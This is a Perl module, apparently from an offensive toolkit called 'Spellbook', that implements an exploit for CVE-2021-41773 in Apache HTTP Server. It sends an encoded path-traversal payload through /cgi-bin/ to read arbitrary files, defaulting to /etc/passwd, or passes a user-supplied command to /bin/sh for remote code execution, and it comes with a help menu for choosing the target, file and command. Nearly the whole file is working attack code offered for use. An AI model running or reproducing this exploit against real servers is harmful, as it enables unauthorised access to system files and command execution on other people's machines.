package Spellbook::Advisory::CVE_2021_41773 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $file, $command);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"      => \$help,
            "t|target=s"  => \$target,
            "f|file=s"    => \$file,
            "c|command=s" => \$command
        );

        if ($target) {
            if ($target !~ /^http(?:s)?:\/\//x) {
                $target = "https://$target";
            }

            if (!$file) { $file = "/etc/passwd"; }

            my $payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/";

            if ($command) {
                $payload = $payload . "/bin/sh";
            }

            else {
                $payload = $payload . $file;
            }

            my $useragent = Spellbook::Core::UserAgent -> new();
            my $request   = $useragent -> get(
               "https://" . $target . $payload,
                Content => $command || " "
            );

            if ($request -> code() == 200) {
                return $request -> content();
            }
        }

        if ($help) {
            return<<"EOT";

Exploit::CVE_2021_41773
=======================
-h, --help     See this menu
-t, --target   Define a target
-f, --file     Define a file to read
-c, --command  Arbitrary code execution\n\n";

EOT
        }

        return 0;
    }
}

1;